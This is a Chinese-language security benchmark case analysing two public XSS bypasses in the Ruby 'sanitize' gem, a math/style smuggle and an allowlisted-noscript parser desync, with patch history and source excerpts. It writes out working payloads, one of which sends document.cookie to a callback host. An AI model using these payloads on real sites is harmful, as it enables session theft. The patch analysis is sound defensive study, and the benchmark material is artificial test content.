# Sanitize：`remove_contents` 只管被丢掉的标签，不管允许名单里的 noscript

- Case：`PCBV2-0189`
- 产品：Ruby gem `sanitize`（allowlist HTML 清洗）。运行时 `gem install sanitize -v 5.2.0/5.2.1/6.0.1` 整包，经 Sinatra `Sanitize.fragment` 再给无头 Chromium 渲染，不是抽出来的配置数组。
- 链：CVE-2020-4054（5.2.0 → 5.2.1，`:remove_contents` 加上 math/svg）→ CVE-2023-23627（5.2.1 → 6.0.1，`CleanElement` 无条件 `unlink` noscript）
- 源码对着 tag `v5.2.1` 的 `lib/sanitize/config/default.rb`、`lib/sanitize/transformers/clean_element.rb`、`lib/sanitize.rb`，以及 `v6.0.1` 的 `CleanElement`。金丝雀是 benign：victim cookie `session=<flag>`，XSS 在页面 load 时 `document.cookie` 打到 callback。

GHSA-p4x4-rw2p-8j8m（4054）把 `noscript` 列进危险元素，修复却只扩大「**被过滤掉的**元素要删光内容」。GHSA-fw3g-2h3j-qmm7（23627）原话：*This issue only affects users who are using a custom config that adds `noscript` to the element allowlist.* 根因是 Nokogiri 按 scripting-disabled 解析 noscript，浏览器按 scripting-enabled 再解析一遍。

根因不只是「漏了一个标签名」。检查插在「这个元素是否在 allowlist」以及「不在 allowlist 时要不要 `remove_contents`」上；真正把 HTML 交给浏览器的是 `fragment` 的返回值。同配置里 `noscript` 已经出现在 `:remove_contents`，但那一行对**允许名单里的** noscript 根本不走。下面按请求走进去。

---

## 这块功能本来在干什么

应用用 RELAXED 再额外允许 `noscript`（「富文本 + 无脚本回退」这种真实配置），清洗用户 HTML 后塞进页面：

```http
GET /?html=<math><style>/*&lt;/style&gt;&lt;img ...
```

```ruby
CONFIG = Sanitize::Config.merge(
  Sanitize::Config::RELAXED,
  :elements => Sanitize::Config::RELAXED[:elements] + %w[noscript]
)
Sanitize.fragment(raw, CONFIG)
```

`Sanitize#initialize` 把 `Transformers::CleanElement` 挂在链尾。`fragment` 用 `Nokogiri::HTML5.fragment`（scripting disabled）建树，再跑 transformer，序列化成 HTML。RELAXED 默认允许 `a` / `img` / `style` / `div` 等，**不允许** `math` / `svg` / `noscript`；本 case 只把 `noscript` 加回去，和两条 GHSA 描述的自定义配置一致。设计意图：不在 allowlist 的标签要么连内容一起扔掉，要么只剥标签留文本；留在树上的节点对浏览器应是 inert 的。成功穿越之后的效果是：**清洗后的字符串在 Chromium 里重新解析成可执行的 `<img onerror>`**，读 cookie 送到 collector。

数据流：

```text
GET /?html=...
    → Sanitize.fragment(html, RELAXED+noscript)
         Nokogiri::HTML5.fragment          ← scripting disabled
         CleanElement
              不在 allowlist？
                   在 :remove_contents 里 → unlink，不 reparent 孩子
                   否则 → 孩子提到前面，再 unlink 标签
              在 allowlist？→ 只洗属性，孩子留下
         to_html
    → 页面 <div id=content>#{output}</div>
    → 浏览器 scripting enabled 再 parse → img onerror → cookie
```

没有登录。GHSA 都标 UI:R：要有人打开那一页。本 case 用无头 Chromium 自动打开。

---

## 原始漏洞：math/svg 外的内容漏出来（CVE-2020-4054，5.2.0）

5.2.0 的 `:remove_contents` 是：

```ruby
# lib/sanitize/config/default.rb  (sanitize v5.2.0)
:remove_contents => %w[
  iframe noembed noframes noscript script style
],
```

没有 `math` / `svg`。RELAXED 也不允许这两个标签。`CleanElement#call` 对不在 allowlist 的节点：

```ruby
# lib/sanitize/transformers/clean_element.rb  (v5.2.1 同逻辑，v5.2.0 亦然)
unless @elements.include?(name) || node.parent.nil?
  unless node.children.empty?
    unless @remove_all_contents || @remove_element_contents.include?(name)
      node.add_previous_sibling(node.children)   # 把孩子留在外面
    end
  end
  node.unlink
end
```

`<math>` 不在 allowlist、也不在 `remove_contents`，于是标签丢掉、孩子留下。Nokogiri 在 HTML5 里把 math 当 foreign content：`<style>` 在 math 里的 tokenize 和在 HTML 里不同，Bentkowski 用 `/*&lt;/style&gt;&lt;img ...` 让「对 sanitizer 是 style 文本、对浏览器是闭合 style + 活 img」同时成立。5.2.0 输出里出现活的 `<img onerror>`。v0 上 victim 执行 JS，callback 收到 flag。上游 5.2.1 回归用例是 `<math><style>/*&lt;/style&gt;&lt;img src onerror=alert(1)>*/`。

---

## 维护者改了什么（CVE-2020-4054 修复，5.2.1）

5.2.1 **只改了一行配置**，transformer 代码不动：

```ruby
# lib/sanitize/config/default.rb  (sanitize v5.2.1)
:remove_contents => %w[
  iframe math noembed noframes noscript plaintext script style svg xmp
],
```

V1 谓词的字面意思：这十个名字如果**作为被过滤掉的元素**出现，连内容一起删。`CleanElement` 在 `env[:is_allowlisted]` 为真时直接 `return`，根本不会看 `@remove_element_contents`。`plaintext` / `xmp` 也是 4054 点名的危险元素，一并加进数组；它们默认不在 RELAXED 里，所以走过滤路径，和 math/svg 同一扇门。`noscript` 在数组里已经待了两个大版本，却只在「不在 allowlist」时有意义。

对 seed 这种非 allowlist 的 `<math>`，它确实够用：`math` 现在在 `remove_contents` 里，孩子不 reparent，输出是空字符串。victim 没有 `onerror` 可跑。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险载体长得像「不在 allowlist 的 math/svg」。
2. 把 `noscript` 写进 `remove_contents` 就等于 noscript 安全——advisory 连名字都点过了。

第二点不成立。应用把 `noscript` **加进了 allowlist**。`remove_contents` 对允许的元素不生效。

---

## 检查之后谁真正把 HTML 交给浏览器

`CleanElement` 对 allowlist 里的 `noscript` 只洗属性，孩子原样序列化。`Sanitize.fragment` 返回的字符串进页面。Nokogiri/gumbo 按 HTML 规范 **scripting disabled** 解析 noscript：里面的标记当普通 DOM（`<div id="</noscript>...">` 是一个属性值）。Chromium 按 **scripting enabled** 解析：`<noscript>` 里的文本不当标签，第一个 `</noscript>`——哪怕写在属性里——也会按「scripting enabled 的 noscript 结束标签」把元素关掉，后面的 `&lt;img ...` 变成真标签。

过滤器刚看过的是「noscript 在不在 allowlist」；浏览器看到的是另一套 tokenization。中间没有第二次「按 scripting-enabled 再 parse 一遍再洗」。

`Sanitize#fragment`：

```ruby
# lib/sanitize.rb  (v5.2.1)
def fragment(html)
  frag = Nokogiri::HTML5.fragment(preprocess(html), **@config[:parser_options])
  node!(frag)
  to_html(frag)
end
```

parser_options 没有「当 scripting enabled 来解析 noscript」这种开关。Nokogiri 做不到。5.2.1 的 `CleanElement` 在 allowlist 分支里会按元素洗 `href`/`src` 协议，但那是「树已经按 scripting-disabled 长好」之后的事：desync 发生在**下一次**浏览器 tokenize，协议检查看不到那时才出现的 `<img>`。

---

## 仓库里已经有更强的处理，allowlist 路径没用

`:remove_contents` 在 5.2.0 就把 `noscript` 列进去了。GHSA-p4x4 的 workaround 数组同样包含它。那只覆盖「noscript 不在 allowlist、作为被过滤元素」的情况。`CleanElement#call` 第一行：

```ruby
return if node.type != Nokogiri::XML::Node::ELEMENT_NODE || env[:is_allowlisted]
```

允许的 noscript 整段跳过。6.0.1 才在 allowlist 分支里加 `when 'noscript'; node.unlink`。transformer 跑在 `node!` 递归上：先处理孩子再处理自己，但 `is_allowlisted` 一旦为真，noscript 的孩子也不会被「按 scripting-enabled 规则」重写，因为 sanitizer 根本没有第二套 parser。

谁处理 noscript（5.2.1）：

| 配置 | `CleanElement` 行为 |
|---|---|
| noscript **不在** allowlist，在 `remove_contents` | 删元素和内容 |
| noscript **在** allowlist | **当作普通元素留下**，Nokogiri 树与浏览器树不一致 |
| math/svg 不在 allowlist，V1 已进 `remove_contents` | 删内容和元素（seed 死） |

不是仓库里没有更好的谓词，是 **允许名单把已有的「删光 noscript」短路了**。GHSA-fw3g 说默认配置不受影响，正是因为默认不允许 noscript——一允许，5.2.1 的那一行配置就帮不上忙。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤掉的 math」和「允许的 noscript」落到具体输入：

- V1 过滤器：不在 allowlist 且名字在 `remove_contents` → 不 reparent
- 浏览器：对允许的 `<noscript>` 按 scripting-enabled 再 tokenize

```text
seed（<math><style>/*</style><img onerror=cookie>*/）:
  math 不在 allowlist，V1 已进 remove_contents
  → 输出 '' → 不执行

residual（<noscript><div id="</noscript><img onerror=cookie> ">）:
  noscript 在 allowlist → CleanElement 留下整棵子树
  → 输出仍含这段 noscript
  → Chromium 把属性里的 </noscript> 当结束标签，img 执行
```

上游 6.0.1 回归用例就是 `<noscript><div id='</noscript>&lt;img src=x onerror=alert(1)&gt; '>`。本 case 把单引号换成双引号以便嵌 exfil URL，同一扇门。

---

## 残余仍然走同一条 Sanitize.fragment（CVE-2023-23627）

没有换 gem API、没有换 RELAXED+noscript、没有换 callback。还是：

```http
GET /?html=<noscript><div id="</noscript>&lt;img src=x onerror=document.location='//callback:9000/c?f='+document.cookie&gt; "></div>
```

`Sanitize.fragment` 仍然用同一份 `CleanElement`。V1 那一行 `remove_contents` 照样不碰允许的 noscript；Nokogiri 照样按 scripting-disabled 建树；Chromium 照样 desync。平台残余和 seed 都是「清洗结果在浏览器里变成 `img onerror` 读 cookie」。不是另一个 HTML 入口，只是走私用的包装元素从 math 换成了 noscript——而这正是 23627 相对 4054 的那条缝。

seed 被挡住只说明「非 allowlist 的 math/svg 不再漏孩子」，不说明「允许的 noscript 在两种解析器下是同构的」。

---

## 后来又补了什么（CVE-2023-23627，6.0.1）

6.0.1 在 `CleanElement` 对**已经 allowlist 的**节点上无条件拆掉 noscript：

```ruby
# lib/sanitize/transformers/clean_element.rb  (sanitize v6.0.1)
# A <noscript> element's content is parsed differently in browsers
# depending on whether or not scripting is enabled. Since Nokogiri doesn't
# support scripting, it always parses <noscript> as if scripting is disabled.
# The safest thing to do is to simply remove all <noscript> elements.
when 'noscript'
  node.unlink
```

注释把根因写死了。对残余输入：noscript 整段从树上拿掉，输出空，victim 不执行。公开建议升级到 6.0.1，或自定义配置里不要允许 noscript。

即便如此，这仍然是「在序列化之前按标签名 unlink」。对本条 desync 够用。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「被丢掉的元素要删光内容」。真正在浏览器里活过来的是 **留下的** noscript 子树。V2 终于在 allowlist 分支动手，而不是再往 `remove_contents` 里加名字。

**不是没有更好的谓词。**  
`noscript` 从 5.2.0 就在 `remove_contents` 里，4054 advisory 也点过名。从 V1 的 diff 只能看到数组多了 `math svg`；要判断是否闭合，必须看到 `env[:is_allowlisted]` 提前 return，以及 Nokogiri 与浏览器对 noscript 的两套 tokenize。

**同一 `Sanitize.fragment`、同一 RELAXED+noscript，只换了包装元素。**  
math 走过滤路径，被 5.2.1 堵住；noscript 走允许路径，活到 6.0.1。

**清洗器的 DOM 和浏览器的 DOM 不是一层。**  
allowlist 以为自己在看「已经解析好的树」。noscript 的规范让同一段字节在 scripting on/off 下长出不同的树。只洗 Nokogiri 那一棵，门是开的。

**金丝雀在 cookie 里是有意的。**  
flag 不在 HTTP 响应原文里。能在 callback 看到它，说明清洗输出在 scripting-enabled 的页面里执行了 `document.cookie`——也就是 `fragment` 放行了会 desync 的那棵树。`GET /raw` 只证明服务器端字符串里还留着 `<noscript>`；真正的效果通道是浏览器执行，和两条 advisory 的 UI:R 一致。

**v0/v1 解析栈是钉死的。**  
nokogiri 1.13.10 + nokogumbo 2.0.5 + crass 1.0.6 在 5.2.0/5.2.1 上相同，唯一变量是 sanitize gem。6.x 内置 gumbo、丢掉 nokogumbo，那是大版本固有差异；scripting-disabled 这条解析规则没变，变的是 6.0.1 不再把 noscript 交给浏览器。

服务器端字符串对照（同一 `Sanitize.fragment`）：

```text
v1 + math seed      →  ''                         （remove_contents 剥光）
v1 + noscript 残余  →  <noscript><div id="</noscript><img ...>">...</noscript>
v2 + 两种输入       →  ''                         （noscript unlink；math 仍剥光）
```

Nokogiri 眼里 `id` 属性值里的 `</noscript>` 只是字符；Chromium 眼里它关闭元素。`CleanElement` 不会对属性值再跑一遍 HTML tokenizer。

---

## 版本、入口、参考

| | 版本 | `:remove_contents` | allowlist 的 noscript | math seed | noscript residual |
|---|---|---|---|---|---|
| V0 | 5.2.0 | 无 math/svg | 留下 | img 漏出，flag | （亦能打，不必） |
| V1 | 5.2.1 | 有 math/svg/noscript | **仍留下** | 输出 '' | desync 执行，flag |
| V2 | 6.0.1 | 同上 | `node.unlink` | 挡 | 输出 '' |

- 库 API：`Sanitize.fragment(html, RELAXED.merge(elements: +%w[noscript]))`；本 case HTTP：`GET /?html=`
- [CVE-2020-4054](https://nvd.nist.gov/vuln/detail/CVE-2020-4054) / [GHSA-p4x4-rw2p-8j8m](https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m)
- [CVE-2023-23627](https://nvd.nist.gov/vuln/detail/CVE-2023-23627) / [GHSA-fw3g-2h3j-qmm7](https://github.com/rgrove/sanitize/security/advisories/GHSA-fw3g-2h3j-qmm7)
- V1 源码：[`v5.2.1` `default.rb`](https://github.com/rgrove/sanitize/blob/v5.2.1/lib/sanitize/config/default.rb)、[`clean_element.rb`](https://github.com/rgrove/sanitize/blob/v5.2.1/lib/sanitize/transformers/clean_element.rb)
- V2 tag：[`v6.0.1` `when 'noscript'`](https://github.com/rgrove/sanitize/blob/v6.0.1/lib/sanitize/transformers/clean_element.rb)
